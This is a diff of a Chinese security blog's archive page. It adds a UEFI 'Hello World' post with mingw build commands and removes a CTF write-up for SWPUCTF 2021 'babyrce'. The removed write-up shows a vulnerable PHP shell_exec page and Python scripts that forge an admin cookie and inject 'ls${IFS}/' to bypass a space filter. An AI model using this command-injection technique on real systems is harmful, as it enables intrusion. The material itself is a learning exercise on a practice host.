@@ -76,6 +76,56 @@
     <div class="article-wrap">
         
             <h2 class="article-title cl">
+                <a href="/2025/09/17/UEFI-Start-Hello-World/" title="UEFI Start - Hello World">
+                    UEFI Start - Hello World
+                </a>
+            </h2>
+        
+
+        <ul class="article-extra" style="margin-bottom: 20px">
+            
+            <li class="article-time">
+                2025-09-17
+            </li>
+            
+
+            
+                
+            
+
+
+        </ul>
+        <div class="article-description">
+            
+            <p>最近在看《从零开始的UEFI裸机编程》(<a target="_blank" rel="noopener" href="https://kagurazakakotori.github.io/ubmp-cn),%E4%BD%9C%E8%80%85%E7%BF%BB%E8%AF%91%E7%9A%84%E9%9D%9E%E5%B8%B8%E5%A5%BD%E3%80%82%E6%8E%A8%E8%8D%90%E8%A7%82%E7%9C%8B%E3%80%82">https://kagurazakakotori.github.io/ubmp-cn),作者翻译的非常好。推荐观看。</a></p>
+<p><img src="/2025/09/17/UEFI-Start-Hello-World/image-20250917112343059.png" alt="image-20250917112343059"></p>
+<p>我们在UEFI入口点传递的SystemTable指针其实就是当系统的UEFI执行到我们的入口点时自动传递的。</p>
+<p>所以我们调用的ClearScreen和OutputString都是调用的系统UEFI内的函数。</p>
+<p>网上大部分都是使用edk2去编译UEFI的内容，但是edk2其实很繁琐。这也就是为什么我选择了《从零开始的UEFI裸机编程》开始学习UEFI原理。</p>
+<pre><code class="hljs Bash"><span class="hljs-built_in">sudo</span> apt install gcc-mingw-w64-x86-64</code></pre>
+
+<pre><code class="hljs Bash">x86_64-w64-mingw32-gcc -Wall -Wextra -e efi_main -nostdinc -nostdlib \        -fno-builtin -Wl,--subsystem,10 -o main.efi main.c</code></pre>
+
+<p>进入UEFI Shell 然后fs0: 切换到fs0</p>
+<p>在这里还踩了坑 UEFI不认NTFS格式的分区</p>
+<p>然后执行</p>
+<p><img src="/2025/09/17/UEFI-Start-Hello-World/image-20250917112653974.png" alt="image-20250917112653974"></p>
+<p><img src="/2025/09/17/UEFI-Start-Hello-World/image-20250917112802000.png" alt="image-20250917112802000"></p>
+
+        </div>
+        
+            
+        
+        
+    </div>
+</article>
+
+        
+            
+            <article class="article">
+    <div class="article-wrap">
+        
+            <h2 class="article-title cl">
                 <a href="/2025/08/18/windows-虚拟内存笔记/" title="windows 虚拟内存笔记">
                     windows 虚拟内存笔记
                 </a>
@@ -776,100 +826,6 @@ resp = requests.post(url=url,headers=header)
 </article>
 
         
-            
-            <article class="article">
-    <div class="article-wrap">
-        
-            <h2 class="article-title cl">
-                <a href="/2025/04/27/从0开始的web生涯-SWPUCTF-2021-新生赛-babyrce/" title="从0开始的web生涯 - [SWPUCTF 2021 新生赛]babyrce">
-                    从0开始的web生涯 - [SWPUCTF 2021 新生赛]babyrce
-                </a>
-            </h2>
-        
-
-        <ul class="article-extra" style="margin-bottom: 20px">
-            
-            <li class="article-time">
-                2025-04-27
-            </li>
-            
-
-            
-                
-            
-
-
-        </ul>
-        <div class="article-description">
-            
-            <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
-<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);
-<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
-<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]==<span class="hljs-number">1</span>) &#123;
-	<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;../next.php&quot;</span>;
-&#125; <span class="hljs-keyword">else</span>
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;小饼干最好吃啦！&quot;</span>;
-<span class="hljs-meta">?&gt;</span> 小饼干最好吃啦！</code></pre>
-
-<p>直接传递cookies admin 为1 就可以</p>
-<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests 
-
-url = <span class="hljs-string">&quot;http://node5.anna.nssctf.cn:29857/&quot;</span>
-
-cookies = &#123;
-
-  <span class="hljs-string">&#x27;admin&#x27;</span>: <span class="hljs-string">&quot;1&quot;</span>
-
-&#125;
-
-resp = requests.post(url=url,cookies=<span class="hljs-number">1</span>)
-
-<span class="hljs-built_in">print</span>(resp.text)
-
-</code></pre>
-
-<p>得到rasalghul.php</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
-<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
-<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;
-	<span class="hljs-variable">$ip</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];
-	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>)) &#123;
-		<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);
-	&#125;
-	<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$ip</span>);
-	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;
-&#125;
-<span class="hljs-meta">?&gt;</span></code></pre>
-
-<p>正则过滤空格 ${IFS}可绕过 ${IFS} - Linux 下的空白字符 </p>
-<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests 
-
-param = <span class="hljs-string">&quot;ls$&#123;IFS&#125;/&quot;</span>
-
-url = <span class="hljs-string">f&quot;http://node5.anna.nssctf.cn:29857/rasalghul.php?url=<span class="hljs-subst">&#123;param&#125;</span>&quot;</span>
-
-resp = requests.get(url=url)
-
-<span class="hljs-built_in">print</span>(resp.text)</code></pre>
-
-<p>flag为flllllaaaaaaggggggg</p>
-<blockquote>
-<p>boot<br>dev<br>etc<br>flllllaaaaaaggggggg<br>home<br>lib<br>lib64<br>media<br>mnt<br>opt<br>proc<br>root<br>run<br>sbin<br>srv<br>sys<br>tmp<br>usr<br>var</p>
-</blockquote>
-<p>结束</p>
-
-        </div>
-        
-            
-        
-        
-    </div>
-</article>
-
-        
         <ul class="pagination clear">
     <span class="page-number current">1</span><a class="page-number" href="/archives/2025/page/2/">2</a><span class="space">&hellip;</span><a class="extend next" rel="next" href="/archives/2025/page/2/">下一页</a>
 </ul>
@@ -883,14 +839,14 @@ resp = requests.get(url=url)
         
         <div class="widget-post widget" style="order: 1 ">
             <h2 class="widget-title"><i class="fa fa-file-text"></i> 近期文章</h2>
-            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/">windows 虚拟内存笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/">Wincor Nixdorf PORT IO Driver Stack Overflow</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/05/23/windows-hook-inline-hook/">windows hook - inline hook</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/">house of orange(欧润吉)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/">2025/4/26 BOCCHI THE ROCK(上)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]no_wakeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]Do_you_know_http</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]ez_unserialize</a></li></ul>
+            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/09/17/UEFI-Start-Hello-World/">UEFI Start - Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/">windows 虚拟内存笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/">Wincor Nixdorf PORT IO Driver Stack Overflow</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/05/23/windows-hook-inline-hook/">windows hook - inline hook</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/">house of orange(欧润吉)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/">2025/4/26 BOCCHI THE ROCK(上)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]no_wakeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]Do_you_know_http</a></li></ul>
         </div>
         
 
         
         <div class="widget-tags widget" style="order: 2 ">
             <h2 class="widget-title"><i class="fa fa-tags"></i> 标签</h2>
-            <a href="/tags/BOCCHI-THE-ROCK/" style="font-size: 10px;">BOCCHI THE ROCK</a> <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/IO-FILE/" style="font-size: 10px;">_IO_FILE</a> <a href="/tags/IO-FILEt/" style="font-size: 10px;">_IO_FILEt</a> <a href="/tags/malloc-hook/" style="font-size: 11.67px;">_malloc_hook</a> <a href="/tags/debug-symbol/" style="font-size: 10px;">debug-symbol</a> <a href="/tags/dirsearch/" style="font-size: 10px;">dirsearch</a> <a href="/tags/fastbin/" style="font-size: 10px;">fastbin</a> <a href="/tags/git-leak/" style="font-size: 10px;">git leak</a> <a href="/tags/glibc/" style="font-size: 16.67px;">glibc</a> <a href="/tags/header/" style="font-size: 10px;">header</a> <a href="/tags/heap/" style="font-size: 18.33px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/house-of-apple2/" style="font-size: 10px;">house of apple2</a> <a href="/tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="/tags/inline-hook/" style="font-size: 10px;">inline hook</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 11.67px;">orw</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwngdb/" style="font-size: 10px;">pwngdb</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/root/" style="font-size: 10px;">root</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 11.67px;">shellcode</a> <a href="/tags/stack/" style="font-size: 11.67px;">stack</a> <a href="/tags/stdout/" style="font-size: 10px;">stdout</a> <a href="/tags/tcache/" style="font-size: 13.33px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unlink/" style="font-size: 11.67px;">unlink</a> <a href="/tags/unserialize/" style="font-size: 11.67px;">unserialize</a> <a href="/tags/virtual-memory/" style="font-size: 10px;">virtual memory</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/windows/" style="font-size: 11.67px;">windows</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 11.67px;">世界杯</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a> <a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 10px;">日常</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a> <a href="/tags/%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">解决</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 10px;">问题</a>
+            <a href="/tags/BOCCHI-THE-ROCK/" style="font-size: 10px;">BOCCHI THE ROCK</a> <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/UEFI/" style="font-size: 10px;">UEFI</a> <a href="/tags/IO-FILE/" style="font-size: 10px;">_IO_FILE</a> <a href="/tags/IO-FILEt/" style="font-size: 10px;">_IO_FILEt</a> <a href="/tags/malloc-hook/" style="font-size: 11.67px;">_malloc_hook</a> <a href="/tags/debug-symbol/" style="font-size: 10px;">debug-symbol</a> <a href="/tags/dirsearch/" style="font-size: 10px;">dirsearch</a> <a href="/tags/fastbin/" style="font-size: 10px;">fastbin</a> <a href="/tags/git-leak/" style="font-size: 10px;">git leak</a> <a href="/tags/glibc/" style="font-size: 16.67px;">glibc</a> <a href="/tags/header/" style="font-size: 10px;">header</a> <a href="/tags/heap/" style="font-size: 18.33px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/house-of-apple2/" style="font-size: 10px;">house of apple2</a> <a href="/tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="/tags/inline-hook/" style="font-size: 10px;">inline hook</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 11.67px;">orw</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwngdb/" style="font-size: 10px;">pwngdb</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/root/" style="font-size: 10px;">root</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 11.67px;">shellcode</a> <a href="/tags/stack/" style="font-size: 11.67px;">stack</a> <a href="/tags/stdout/" style="font-size: 10px;">stdout</a> <a href="/tags/tcache/" style="font-size: 13.33px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unlink/" style="font-size: 11.67px;">unlink</a> <a href="/tags/unserialize/" style="font-size: 11.67px;">unserialize</a> <a href="/tags/virtual-memory/" style="font-size: 10px;">virtual memory</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/windows/" style="font-size: 11.67px;">windows</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 11.67px;">世界杯</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a> <a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 10px;">日常</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a> <a href="/tags/%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">解决</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 10px;">问题</a>
         </div>
         
 
